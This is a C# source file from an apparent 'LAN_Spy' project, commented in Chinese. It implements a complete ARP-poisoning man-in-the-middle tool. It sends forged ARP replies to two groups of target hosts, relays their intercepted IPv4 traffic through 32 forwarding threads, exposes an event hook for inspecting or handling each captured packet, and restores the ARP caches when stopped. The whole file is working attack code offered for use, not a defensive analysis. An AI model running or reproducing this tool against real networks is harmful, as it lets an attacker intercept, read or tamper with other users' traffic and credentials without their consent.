using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using LAN_Spy.Model.Classes;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;

namespace LAN_Spy.Model {
    /// <inheritdoc />
    /// <summary>
    ///     ARP毒化器。
    /// </summary>
    public class Poisoner : BasicClass {
        /// <summary>
        ///     转发线程中对数据包到达事件的委托。
        /// </summary>
        /// <param name="packet">要处理的到达数据包</param>
        /// <param name="isHandled">表示此数据包是否已被处理不再需要转发。</param>
        public delegate void OnPacketReceive(Packet packet, out bool isHandled);

        /// <summary>
        ///     毒化线程句柄。
        /// </summary>
        private readonly List<Thread> _poisonThreads = new List<Thread>();

        /// <summary>
        ///     包转发线程句柄。
        /// </summary>
        private readonly List<Thread> _retransmissionThreads = new List<Thread>();

        /// <summary>
        ///     毒化目标缓存。
        /// </summary>
        private readonly List<Host> _target1 = new List<Host>(), _target2 = new List<Host>();

        /// <summary>
        ///     使用设备缓存。
        /// </summary>
        private ICaptureDevice _device;

        /// <summary>
        ///     使用设备IP地址缓存。
        /// </summary>
        private IPAddress _deviceAddress;

        /// <summary>
        ///     默认网关缓存。
        /// </summary>
        private Host _gateway;

        /// <summary>
        ///     供转发线程使用的 <see cref="IPAddress" /> 二分查找哈希表。
        /// </summary>
        private HashTable _hashTable;

        /// <summary>
        ///     默认网关。
        /// </summary>
        public Host Gateway;

        /// <summary>
        ///     毒化目标。
        /// </summary>
        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();

        /// <summary>
        ///     根据设定的 <see cref="List{T}" /> 类型的目标列表进行ARP毒化中间人攻击，如果模块已在工作状态则不会有效果。
        /// </summary>
        /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
        public void StartPoisoning() {
            // 判断是否有未停止的毒化工作
            if (_device != null)
                throw new InvalidOperationException("已有一项毒化工作正在进行。");

            // 深复制以缓存目标
            _target1.AddRange(Target1);
            _target2.AddRange(Target2);

            // 构建哈希表
            var hashList = new List<KeyValuePair<int, object>>();
            foreach (var host in Target1) {
                if (hashList.Any(item => ((Host) item.Value).IPAddress.Equals(host.IPAddress))) {
                    Console.Error.WriteLine($"警告：检测到目标列表中存在重复的IP地址 {host.IPAddress} ，将忽略此条信息。");
                    continue;
                }
                hashList.Add(new KeyValuePair<int, object>(host.IPAddress.GetHashCode(), host));
            }
            foreach (var host in Target2) {
                if (hashList.Any(item => ((Host) item.Value).IPAddress.Equals(host.IPAddress))) {
                    Console.Error.WriteLine($"警告：检测到目标列表中存在重复的IP地址 {host.IPAddress} ，将忽略此条信息。");
                    continue;
                }
                hashList.Add(new KeyValuePair<int, object>(host.IPAddress.GetHashCode(), host));
            }
            _hashTable = new HashTable(hashList);


            // 深复制以缓存网关
            _gateway = Gateway == null ?
                new Host(new IPAddress(new byte[] {0, 0, 0, 0}), new PhysicalAddress(new byte[] {0, 0, 0, 0, 0, 0})) :
                new Host(Gateway.IPAddress, Gateway.PhysicalAddress);

            // 缓存并打开当前设备
            _device = StartCapture("arp [6:2] = 1 or ip");
            _deviceAddress = Ipv4Address;

            // 创建包转发线程
            for (var i = 0; i < 32; i++) {
                var retransmissionThread = new Thread(RetransmissionThread);
                retransmissionThread.Start();
                _retransmissionThreads.Add(retransmissionThread);
            }

            // 开始毒化
            foreach (var target in _target1) {
                var poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
            foreach (var target in _target2) {
                var poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
        }

        /// <summary>
        ///     毒化线程。
        /// </summary>
        /// <param name="obj">毒化的目标。</param>
        private void PoisonThread(object obj) {
            // 获取目标
            var host = (Host) obj;

            // 转存目标
            var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();

            // 构建包信息
            var ether = new EthernetPacket(_device.MacAddress,
                host.PhysicalAddress,
                EthernetPacketType.Arp);
            var arp = new ARPPacket(ARPOperation.Response,
                host.PhysicalAddress,
                host.IPAddress,
                _device.MacAddress,
                new IPAddress(new byte[] {0, 0, 0, 0})) {
                HardwareAddressType = LinkLayers.Ethernet,
                ProtocolAddressType = EthernetPacketType.IPv4
            };
            ether.PayloadPacket = arp;
            arp.ParentPacket = ether;

            try {
                // 强毒化
                for (var i = 0; i < 20; i++) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(500);
                }

                // 弱毒化
                while (true) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(5 * 1000);
                }
            }
            catch (ThreadAbortException) {
                // 还原ARP
                foreach (var target in targets) {
                    ether.SourceHwAddress = target.PhysicalAddress;
                    arp.SenderProtocolAddress = target.IPAddress;
                    arp.SenderHardwareAddress = target.PhysicalAddress;
                    arp.UpdateCalculatedValues();
                    for (var i = 0; i < 5; i++)
                        _device.SendPacket(ether);
                }
            }
        }

        /// <summary>
        ///     包转发线程。
        /// </summary>
        private void RetransmissionThread() {
            try {
                while (true) {
                    // 从队列中请求一个数据包
                    RawCapture packet;
                    if ((packet = NextRawCapture) != null) {
                        // 分析数据包中的数据
                        var ether = new EthernetPacket(new ByteArraySegment(packet.Data));

                        // 由本机发出的数据包，忽略
                        if (ether.SourceHwAddress.ToString().Equals(_device.MacAddress.ToString())) continue;

                        if (ether.Type == EthernetPacketType.IPv4) {
                            // 解析IPv4包
                            var ipv4Packet = (IPv4Packet) ether.PayloadPacket;
                            if (!(OnIPv4PacketReceive is null)) {
                                OnIPv4PacketReceive.Invoke(ipv4Packet, out var isHandled);
                                if (isHandled) continue;
                            }

                            // 组1或组2接收的数据包
                            if (_hashTable[ipv4Packet.DestinationAddress.GetHashCode()] is Host dest)
                                ether.DestinationHwAddress = dest.PhysicalAddress;
                            // 组1或组2发送的数据包且接收者并非本机
                            else if (_hashTable[ipv4Packet.SourceAddress.GetHashCode()] is Host && !ipv4Packet.DestinationAddress.Equals(_deviceAddress))
                                ether.DestinationHwAddress = _gateway.PhysicalAddress;
                            // 不需要转发数据包
                            else
                                continue;

                            // 转发数据包到指定目标
                            ether.SourceHwAddress = _device.MacAddress;
                            _device.SendPacket(ether);
                        }
                        else if (ether.Type == EthernetPacketType.Arp) {
                            // 解析ARP包
                            var arp = (ARPPacket) ether.PayloadPacket;

                            // 非两组间发送的数据包，跳过
                            if (_hashTable[arp.SenderProtocolAddress.GetHashCode()] is null
                                || _hashTable[arp.TargetProtocolAddress.GetHashCode()] is null)
                                continue;

                            // 构建包信息
                            var e = new EthernetPacket(_device.MacAddress,
                                arp.SenderHardwareAddress,
                                EthernetPacketType.Arp);
                            e.UpdateCalculatedValues();
                            var a = new ARPPacket(ARPOperation.Response,
                                arp.SenderHardwareAddress,
                                arp.SenderProtocolAddress,
                                _device.MacAddress,
                                arp.TargetProtocolAddress) {
                                HardwareAddressType = LinkLayers.Ethernet,
                                ProtocolAddressType = EthernetPacketType.IPv4
                            };
                            a.UpdateCalculatedValues();

                            e.PayloadPacket = a;
                            a.ParentPacket = e;

                            // 发送响应包到指定目标
                            _device.SendPacket(e);
                        }
                    }
                    else
                        // 队列尚未获得数据，挂起等待
                    {
                        Thread.Sleep(100);
                    }
                }
            }
            catch (ThreadAbortException) { }
        }

        /// <summary>
        ///     停止ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="TimeoutException">等待线程结束超时。</exception>
        public void StopPoisoning() {
            // 向毒化线程发送终止信号
            foreach (var poisonThread in _poisonThreads)
                if (poisonThread.IsAlive)
                    poisonThread.Abort();

            // 等待毒化线程终止
            new WaitTimeoutChecker(30000).ThreadSleep(100, () => _poisonThreads.Any(item => item.IsAlive));
            _poisonThreads.Clear();

            // 向包转发线程发送终止信号
            foreach (var retransmissionThread in _retransmissionThreads)
                if (retransmissionThread.IsAlive)
                    retransmissionThread.Abort();

            // 等待包转发线程终止
            new WaitTimeoutChecker(30000).ThreadSleep(100, () => _retransmissionThreads.Any(item => item.IsAlive));
            _poisonThreads.Clear();
            _retransmissionThreads.Clear();

            // 关闭设备
            if (!(_device is null)) {
                StopCapture(_device);
                _device = null;
            }

            // 清理缓冲区
            _gateway = null;
            _target1.Clear();
            _target2.Clear();
            ClearCaptures();
        }

        /// <summary>
        ///     重置目标、默认网关设置并清空数据包缓冲区，不会对正在进行的毒化工作的设置造成影响。
        /// </summary>
        public void Reset() {
            Target1.Clear();
            Target2.Clear();
            Gateway = null;
            ClearCaptures();
        }

        /// <summary>
        ///     转发线程遇到IPv4数据包时触发的事件。
        /// </summary>
        public event OnPacketReceive OnIPv4PacketReceive;
    }
}